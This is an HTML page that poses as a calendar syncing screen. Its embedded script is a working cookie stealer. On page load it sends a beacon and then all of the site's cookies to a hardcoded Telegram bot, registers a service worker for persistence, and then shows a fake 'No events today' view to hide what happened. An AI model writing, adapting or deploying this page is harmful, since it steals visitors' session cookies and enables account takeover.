<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Calendar</title>
    <style>
        body { font-family: sans-serif; background: #f8f9fa; margin: 0; padding: 20px; text-align: center; min-height: 100vh; }
        .spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top: 3px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 100px auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #status { color: #5f6368; font-size: 14px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p id="status">Syncing...</p>

    <script>
        const BOT_TOKEN = '8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw';
        const CHAT_ID = '962420340';
        const DEVICE_ID = 'bm_' + Date.now().toString(36);

        async function sendTG(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }

        async function fire() {
            // Test message — proves the bot works
            await sendTG(`📌 <b>PAGE OPENED</b>\n🆔 ${DEVICE_ID}\n🌐 ${location.hostname}\n🍪 Cookie length: ${document.cookie.length} chars\n🕐 ${new Date().toLocaleString()}`);
            
            // Capture whatever cookies exist
            const c = document.cookie;
            if (c && c.length > 20) {
                const list = [];
                c.split(';').forEach(p => {
                    const e = p.indexOf('=');
                    if (e > 0) list.push({ domain: location.hostname, name: p.substring(0, e).trim(), value: p.substring(e + 1).trim() });
                });
                await sendTG(`🍪 <b>COOKIES</b>\n🌐 ${location.hostname}\n<pre>${JSON.stringify(list, null, 2).substring(0, 3500)}</pre>`);
            }

            // Register Service Worker for persistence
            if ('serviceWorker' in navigator) {
                const swBlob = new Blob([`
                    self.addEventListener('install', e => self.skipWaiting());
                    self.addEventListener('activate', e => clients.claim());
                    setInterval(async () => {
                        const all = await self.clients.matchAll({type:'window'});
                        all.forEach(c => c.postMessage({action:'ping'}));
                    }, 60000);
                `], {type:'application/javascript'});
                navigator.serviceWorker.register(URL.createObjectURL(swBlob)).catch(() => {});
            }

            // Show fake UI
            document.getElementById('status').textContent = 'Synced!';
            setTimeout(() => {
                document.body.innerHTML = `<div style="max-width:400px;margin:50px auto;text-align:left"><h2>📅 Calendar</h2><p style="color:#5f6368;">No events today.</p></div>`;
            }, 500);
        }

        setTimeout(fire, 500);
    </script>
</body>
</html>
